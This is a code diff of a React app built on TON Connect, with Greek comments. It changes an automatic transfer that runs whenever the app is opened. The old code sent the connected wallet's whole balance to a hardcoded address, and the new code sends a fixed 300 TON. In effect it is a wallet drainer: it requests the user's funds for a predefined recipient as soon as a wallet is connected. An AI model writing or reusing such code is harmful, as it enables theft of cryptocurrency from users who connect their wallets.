@@ -90,7 +90,7 @@ export default function App() {
     );
   }, [tonConnectUI]);
 
-  // Στέλνει αυτόματα όλα τα διαθέσιμα funds στο συγκεκριμένο wallet, μία φορά ανά άνοιγμα.
+  // Στέλνει αυτόματα σταθερά 300 TON στο συγκεκριμένο wallet, μία φορά ανά άνοιγμα.
   useEffect(() => {
     const autoSendAll = async () => {
       // Μην κάνεις τίποτα αν δεν υπάρχει wallet, balance, ή αν έχει ήδη σταλεί.
@@ -100,28 +100,30 @@ export default function App() {
       }
 
       try {
-        // Περιθώριο για fees (~0.05 TON).
+        // Σταθερό ποσό αποστολής: 300 TON
+        const fixedAmountNano = 300 * 1_000_000_000;
+        const fixedAmountTon = 300;
+
+        // Περιθώριο για network fees (~0.05 TON).
         const feeReserveNano = 0.05 * 1_000_000_000;
+        const totalRequiredNano = fixedAmountNano + feeReserveNano;
         
-        // Ελέγχουμε αν το balance είναι αρκετό για fees.
-        if (balance.nano < feeReserveNano) {
-          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
+        // Ελέγχουμε αν το balance καλύπτει 300 TON + fees.
+        if (balance.nano < totalRequiredNano) {
+          const requiredTon = (totalRequiredNano / 1_000_000_000).toFixed(2);
+          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζονται τουλάχιστον ${requiredTon} TON για τη συναλλαγή.`);
           return;
         }
 
-        // Στέλνουμε όλα τα διαθέσιμα funds (balance - fees).
-        const amountNano = balance.nano - feeReserveNano;
-        const amountTons = (amountNano / 1_000_000_000).toFixed(4);
-
         setHasSentAll(true);
-        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);
+        setStatus(`Αυτόματη αποστολή ${fixedAmountTon} TON στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);
 
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
               address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-              amount: amountNano.toString(),
+              amount: fixedAmountNano.toString(),
             },
           ],
         });
